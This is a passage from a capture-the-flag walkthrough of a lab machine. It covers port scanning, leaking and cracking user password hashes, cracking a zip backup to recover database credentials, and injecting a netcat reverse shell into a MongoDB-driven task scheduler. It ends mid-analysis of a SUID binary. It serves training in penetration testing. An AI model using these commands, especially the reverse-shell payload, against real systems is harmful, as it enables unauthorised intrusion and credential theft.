I"@ê<h1 id="masscan--nmap">Masscan + Nmap</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
Discovered open port 22/tcp on 10.10.10.58                                     
Discovered open port 3000/tcp on 10.10.10.58                                   
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Parse those ports to nmap:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
<span class="nv">$ </span>nmap <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
<span class="c"># Nmap 7.91 scan initiated Fri Jul 23 21:06:02 2021 as: nmap -sVC --min-rate 1000 -p 22,3000 -oN nmap-fullscan.out 10.10.10.58</span>
Nmap scan report <span class="k">for </span>10.10.10.58
Host is up <span class="o">(</span>0.086s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da <span class="o">(</span>RSA<span class="o">)</span>
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 <span class="o">(</span>ED25519<span class="o">)</span>
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Fri Jul 23 21:06:18 2021 -- 1 IP address (1 host up) scanned in 16.14 seconds</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h1 id="apache-hadoop">Apache hadoop</h1>
<p>I search for any exploits, there was one, which wasnâ€™t much applicable.
Visiting home page gives a endpoint /login, which asks for username and password, tried for common username and password. 
Nothing worked.
Tried looking for some SQL injection, doesnâ€™t seem the way.</p>

<p>Looking at the source code, there are some js files, one of them is <code class="language-plaintext highlighter-rouge">profile.js</code>. 
This one gives an endpoint <code class="language-plaintext highlighter-rouge">/api/users</code>
Which gives this json data:</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td> --><td class="rouge-code"><pre><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"59a7365b98aa325cc03ee51c"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"myP14ceAdm1nAcc0uNT"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"is_admin"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"59a7368398aa325cc03ee51d"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"tom"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"is_admin"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"59a7368e98aa325cc03ee51e"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"mark"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"is_admin"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"59aa9781cced6f1d1490fce9"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rastating"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"is_admin"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Submitting these passwords in online hash cracking sites like <a href="https://crackstation.net/">crackstation</a> gives:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af	sha256	manchester
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240	sha256	spongebob
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73	sha256	snowflake
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0	Unknown	Not found.
</pre></td></tr></tbody></table></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">myP14ceAdm1nAcc0uNT:manchester</code> seems a valid password for the admin panel.</p>

<h1 id="foothold">Foothold</h1>
<p>Download the backup file:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-XGET</span> <span class="nt">-b</span> <span class="s1">'connect.sid=s%3A4dZnYoXx7Gf_YqXNK7ceSpA_tb9nvy-T.pgkpfbvxgRkiqV8soUEzOzXjPGvosxKolqgu3MumiRo'</span> http://10.10.10.58:3000/api/admin/backup
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Looks like base64 encoded data, decoding it:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>myplace.backup | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> myplace-decoded
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Checking the file-type of decoded data:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>file myplace-decoded
myplace-decoded: Zip archive data, at least v1.0 to extract
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Unziping but it asks for a password
Using zip2john to get hash:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>zip2john archive  2&gt;/dev/null
archive:<span class="nv">$pkzip2$3</span><span class="k">*</span>2<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>9c88<span class="k">*</span>1223<span class="k">*</span>e1154c110f34830b65717fc169586f2e1bbf3e7adb7565dec080f1bcd0d8bfe351a48039<span class="k">*</span>1<span class="k">*</span>0<span class="k">*</span>8<span class="k">*</span>24<span class="k">*</span>37ef<span class="k">*</span>0145<span class="k">*</span>30378f7c5482d1f2b8119c622dea729d2e5fc3846c236f45cb9c7109740cfe73bb8127ed<span class="k">*</span>2<span class="k">*</span>0<span class="k">*</span>11<span class="k">*</span>5<span class="k">*</span>118f1dfc<span class="k">*</span>94cb<span class="k">*</span>67<span class="k">*</span>0<span class="k">*</span>11<span class="k">*</span>118f<span class="k">*</span>3d0f<span class="k">*</span>ba794e6d8162c81484c72a82e3e2c4d660<span class="k">*</span><span class="nv">$/</span>pkzip2<span class="nv">$:</span>:archive:var/www/myplace/node_modules/qs/.eslintignore, var/www/myplace/node_modules/serve-static/README.md, var/www/myplace/package-lock.json:archive
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Using john to crack the hash:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre>john <span class="nb">hash</span> <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
magicword        <span class="o">(</span>archive<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2021-07-23 22:09<span class="o">)</span> 7.692g/s 1417Kp/s 1417Kc/s 1417KC/s santiago2..joelo
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Unzip the zip file and at <code class="language-plaintext highlighter-rouge">var/www/myplace</code> you get app.js which contains:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td> --><td class="rouge-code"><pre><span class="nb">cat </span>app.js

const express     <span class="o">=</span> require<span class="o">(</span><span class="s1">'express'</span><span class="o">)</span><span class="p">;</span>
const session     <span class="o">=</span> require<span class="o">(</span><span class="s1">'express-session'</span><span class="o">)</span><span class="p">;</span>
const bodyParser  <span class="o">=</span> require<span class="o">(</span><span class="s1">'body-parser'</span><span class="o">)</span><span class="p">;</span>
const crypto      <span class="o">=</span> require<span class="o">(</span><span class="s1">'crypto'</span><span class="o">)</span><span class="p">;</span>
const MongoClient <span class="o">=</span> require<span class="o">(</span><span class="s1">'mongodb'</span><span class="o">)</span>.MongoClient<span class="p">;</span>
const ObjectID    <span class="o">=</span> require<span class="o">(</span><span class="s1">'mongodb'</span><span class="o">)</span>.ObjectID<span class="p">;</span>
const path        <span class="o">=</span> require<span class="o">(</span><span class="s2">"path"</span><span class="o">)</span><span class="p">;</span>
const spawn        <span class="o">=</span> require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.spawn<span class="p">;</span>
const app         <span class="o">=</span> express<span class="o">()</span><span class="p">;</span>
const url         <span class="o">=</span> <span class="s1">'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace'</span><span class="p">;</span>
const backup_key  <span class="o">=</span> <span class="s1">'45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474'</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>So username <code class="language-plaintext highlighter-rouge">mark:5AYRft73VtFpc84k</code>
And we can ssh as mark.</p>

<h1 id="lateral-privesc-to-tom">Lateral privesc to tom</h1>
<p>Checking out for running process, we see 2 processes running from user <code class="language-plaintext highlighter-rouge">tom</code>.
<code class="language-plaintext highlighter-rouge">/var/www/myplace/app.js</code> is myplace which runs on port 3000, but  <code class="language-plaintext highlighter-rouge">/var/scheduler/app.js</code> is suspicious.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>tom       1242  7.8  9.4 1059588 71280 ?       Ssl  16:34   8:52 /usr/bin/node /var/www/myplace/app.js
tom       1247  0.0  5.2 1008568 39576 ?       Ssl  16:34   0:02 /usr/bin/node /var/scheduler/app.js
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Letâ€™s checkout how <code class="language-plaintext highlighter-rouge">/var/scheduler/app.js</code> works:</p>
<ul>
  <li>It uses markâ€™s creds for accessing mongodb.</li>
  <li>Uses database <code class="language-plaintext highlighter-rouge">scheduler</code> and checks for any collection named <code class="language-plaintext highlighter-rouge">tasks</code>.</li>
  <li>Checks if it contains any documents, it prints <code class="language-plaintext highlighter-rouge">Executing task _id ...</code> and then executes anything in <code class="language-plaintext highlighter-rouge">cmd</code> field.</li>
  <li>Then it deletes the document it executed.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td> --><td class="rouge-code"><pre><span class="nb">cat</span> /var/scheduler/app.js
const <span class="nb">exec</span>        <span class="o">=</span> require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.exec<span class="p">;</span>
const MongoClient <span class="o">=</span> require<span class="o">(</span><span class="s1">'mongodb'</span><span class="o">)</span>.MongoClient<span class="p">;</span>
const ObjectID    <span class="o">=</span> require<span class="o">(</span><span class="s1">'mongodb'</span><span class="o">)</span>.ObjectID<span class="p">;</span>
const url         <span class="o">=</span> <span class="s1">'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler'</span><span class="p">;</span>

MongoClient.connect<span class="o">(</span>url, <span class="k">function</span><span class="o">(</span>error, db<span class="o">)</span> <span class="o">{</span>
  <span class="k">if</span> <span class="o">(</span>error <span class="o">||</span> <span class="o">!</span>db<span class="o">)</span> <span class="o">{</span>
    console.log<span class="o">(</span><span class="s1">'[!] Failed to connect to mongodb'</span><span class="o">)</span><span class="p">;</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="o">}</span>

  setInterval<span class="o">(</span><span class="k">function</span> <span class="o">()</span> <span class="o">{</span>
    db.collection<span class="o">(</span><span class="s1">'tasks'</span><span class="o">)</span>.find<span class="o">()</span>.toArray<span class="o">(</span><span class="k">function</span> <span class="o">(</span>error, docs<span class="o">)</span> <span class="o">{</span>
      <span class="k">if</span> <span class="o">(!</span>error <span class="o">&amp;&amp;</span> docs<span class="o">)</span> <span class="o">{</span>
        docs.forEach<span class="o">(</span><span class="k">function</span> <span class="o">(</span>doc<span class="o">)</span> <span class="o">{</span>
          <span class="k">if</span> <span class="o">(</span>doc<span class="o">)</span> <span class="o">{</span>
            console.log<span class="o">(</span><span class="s1">'Executing task '</span> + doc._id + <span class="s1">'...'</span><span class="o">)</span><span class="p">;</span>
            <span class="nb">exec</span><span class="o">(</span>doc.cmd<span class="o">)</span><span class="p">;</span>
            db.collection<span class="o">(</span><span class="s1">'tasks'</span><span class="o">)</span>.deleteOne<span class="o">({</span> _id: new ObjectID<span class="o">(</span>doc._id<span class="o">)</span> <span class="o">})</span><span class="p">;</span>
          <span class="o">}</span>
        <span class="o">})</span><span class="p">;</span>
      <span class="o">}</span>
      <span class="k">else if</span> <span class="o">(</span>error<span class="o">)</span> <span class="o">{</span>
        console.log<span class="o">(</span><span class="s1">'Something went wrong: '</span> + error<span class="o">)</span><span class="p">;</span>
      <span class="o">}</span>
    <span class="o">})</span><span class="p">;</span>
  <span class="o">}</span>, 30000<span class="o">)</span><span class="p">;</span>

<span class="o">})</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can connect, list, insert and then check collection data in <code class="language-plaintext highlighter-rouge">scheduler</code>. You can checkout the manual for commands references: <a href="https://docs.mongodb.com/manual/reference/method/db.collection.insertOne/#examples">docs.mongodb</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>mongo scheduler <span class="nt">-u</span> mark <span class="nt">-p</span> 5AYRft73VtFpc84k
MongoDB shell version: 3.2.16
connecting to: scheduler
<span class="o">&gt;</span> show collections
tasks
<span class="o">&gt;</span> db.tasks.insertOne<span class="o">(</span> <span class="o">{</span> _id: 1, cmd: <span class="s2">"touch /tmp/caretaker"</span> <span class="o">}</span> <span class="o">)</span><span class="p">;</span>
<span class="o">{</span> <span class="s2">"acknowledged"</span> : <span class="nb">true</span>, <span class="s2">"insertedId"</span> : 1 <span class="o">}</span>
<span class="o">&gt;</span> db.tasks.find<span class="o">()</span>
<span class="o">{</span> <span class="s2">"_id"</span> : 1, <span class="s2">"cmd"</span> : <span class="s2">"touch /tmp/caretaker"</span> <span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And after 30s, I can confirm that tom has written onto /tmp:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>mark@node:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> caretaker
<span class="nt">-rw-r--r--</span> 1 tom tom 0 Jul 23 23:53 caretaker
</pre></td></tr></tbody></table></code></pre></div></div>

<p>At any point of time, if you like to drop the collection to clear up things:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="o">&gt;</span> db.tasks.drop<span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Getting reverse shell as <code class="language-plaintext highlighter-rouge">tom</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="o">&gt;</span> db.tasks.insertOne<span class="o">(</span> <span class="o">{</span> _id: 2, cmd: <span class="s2">"bash -c 'rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.9 4444 &gt;/tmp/a'"</span> <span class="o">}</span> <span class="o">)</span><span class="p">;</span>
<span class="o">{</span> <span class="s2">"acknowledged"</span> : <span class="nb">true</span>, <span class="s2">"insertedId"</span> : 2 <span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>and I get a shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lnvp</span> 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.58 58550
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>28294<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
To run a <span class="nb">command </span>as administrator <span class="o">(</span>user <span class="s2">"root"</span><span class="o">)</span>, use <span class="s2">"sudo &lt;command&gt;"</span><span class="nb">.</span>
See <span class="s2">"man sudo_root"</span> <span class="k">for </span>details.

tom@node:/<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="vertical-privesc-to-root">Vertical privesc to root</h1>
<p>Checking for SUID-perms shows tom has permissions to execute <code class="language-plaintext highlighter-rouge">/usr/local/bin/backup</code> as heâ€™s in admin group.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre>tom@node:~<span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If I open this binary in a decompiler, it shows a code piece like this. Which shows that the binary accepts 3 parameters. (Says 4, one of them being the binary itself.)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre>  <span class="k">if</span> <span class="o">(</span>param_1 &lt; 4<span class="o">)</span> <span class="o">{</span>
    <span class="nb">exit</span><span class="o">(</span>1<span class="o">)</span><span class="p">;</span>
  <span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If I run the binary giving three params with any value, it gives <code class="language-plaintext highlighter-rouge">[!] Ah-ah-ah! You didn't say the magic word!</code> :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>/usr/local/bin/backup 1 2 3



             ____________________________________________________
            /                                                    <span class="se">\</span>
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            <span class="se">\_</span>____________________________________________________/
                   <span class="se">\_</span>______________________________________/
                _______________________________________________
             _-<span class="s1">'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'</span>.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.<span class="sb">`</span><span class="nt">-_</span>
       _-<span class="s1">'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'</span>.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.<span class="sb">`</span><span class="nt">-_</span>
 _-<span class="s1">'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'</span>


 <span class="o">[!]</span> Ah-ah-ah! You didn<span class="s1">'t say the magic word!
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Iâ€™ll check what the binary is doing in the background with ltrace:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>ltrace /usr/local/bin/backup 1 2 3

strncpy<span class="o">(</span>0xff817f08, <span class="s2">"2"</span>, 100<span class="o">)</span>                    <span class="o">=</span> 0xff817f08
strcpy<span class="o">(</span>0xff817ef1, <span class="s2">"/"</span><span class="o">)</span>                          <span class="o">=</span> 0xff817ef1
strcpy<span class="o">(</span>0xff817efd, <span class="s2">"/"</span><span class="o">)</span>                          <span class="o">=</span> 0xff817efd
strcpy<span class="o">(</span>0xff817e87, <span class="s2">"/e"</span><span class="o">)</span>                         <span class="o">=</span> 0xff817e87
strcat<span class="o">(</span><span class="s2">"/e"</span>, <span class="s2">"tc"</span><span class="o">)</span>                               <span class="o">=</span> <span class="s2">"/etc"</span>
strcat<span class="o">(</span><span class="s2">"/etc"</span>, <span class="s2">"/m"</span><span class="o">)</span>                             <span class="o">=</span> <span class="s2">"/etc/m"</span>
strcat<span class="o">(</span><span class="s2">"/etc/m"</span>, <span class="s2">"yp"</span><span class="o">)</span>                           <span class="o">=</span> <span class="s2">"/etc/myp"</span>
strcat<span class="o">(</span><span class="s2">"/etc/myp"</span>, <span class="s2">"la"</span><span class="o">)</span>                         <span class="o">=</span> <span class="s2">"/etc/mypla"</span>
strcat<span class="o">(</span><span class="s2">"/etc/mypla"</span>, <span class="s2">"ce"</span><span class="o">)</span>                       <span class="o">=</span> <span class="s2">"/etc/myplace"</span>
strcat<span class="o">(</span><span class="s2">"/etc/myplace"</span>, <span class="s2">"/k"</span><span class="o">)</span>                     <span class="o">=</span> <span class="s2">"/etc/myplace/k"</span>
strcat<span class="o">(</span><span class="s2">"/etc/myplace/k"</span>, <span class="s2">"ey"</span><span class="o">)</span>                   <span class="o">=</span> <span class="s2">"/etc/myplace/key"</span>
strcat<span class="o">(</span><span class="s2">"/etc/myplace/key"</span>, <span class="s2">"s"</span><span class="o">)</span>                  <span class="o">=</span> <span class="s2">"/etc/myplace/keys"</span>
fopen<span class="o">(</span><span class="s2">"/etc/myplace/keys"</span>, <span class="s2">"r"</span><span class="o">)</span>                  <span class="o">=</span> 0x988a010
fgets<span class="o">(</span><span class="s2">"a01a6aa5aaf1d7729f35c8278daae30f"</span>..., 1000, 0x988a010<span class="o">)</span> <span class="o">=</span> 0xff817a9f
strcspn<span class="o">(</span><span class="s2">"a01a6aa5aaf1d7729f35c8278daae30f"</span>..., <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">=</span> 64
strcmp<span class="o">(</span><span class="s2">"2"</span>, <span class="s2">"a01a6aa5aaf1d7729f35c8278daae30f"</span>...<span class="o">)</span> <span class="o">=</span> <span class="nt">-1</span>
fgets<span class="o">(</span><span class="s2">"45fac180e9eee72f4fd2d9386ea7033e"</span>..., 1000, 0x988a010<span class="o">)</span> <span class="o">=</span> 0xff817a9f
strcspn<span class="o">(</span><span class="s2">"45fac180e9eee72f4fd2d9386ea7033e"</span>..., <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">=</span> 64
strcmp<span class="o">(</span><span class="s2">"2"</span>, <span class="s2">"45fac180e9eee72f4fd2d9386ea7033e"</span>...<span class="o">)</span> <span class="o">=</span> <span class="nt">-1</span>
fgets<span class="o">(</span><span class="s2">"3de811f4ab2b7543eaf45df611c2dd25"</span>..., 1000, 0x988a010<span class="o">)</span> <span class="o">=</span> 0xff817a9f
strcspn<span class="o">(</span><span class="s2">"3de811f4ab2b7543eaf45df611c2dd25"</span>..., <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">=</span> 64
strcmp<span class="o">(</span><span class="s2">"2"</span>, <span class="s2">"3de811f4ab2b7543eaf45df611c2dd25"</span>...<span class="o">)</span> <span class="o">=</span> <span class="nt">-1</span>
fgets<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1000, 0x988a010<span class="o">)</span>                     <span class="o">=</span> 0xff817a9f
strcspn<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>                              <span class="o">=</span> 0
strcmp<span class="o">(</span><span class="s2">"2"</span>, <span class="s2">""</span><span class="o">)</span>                                  <span class="o">=</span> 1
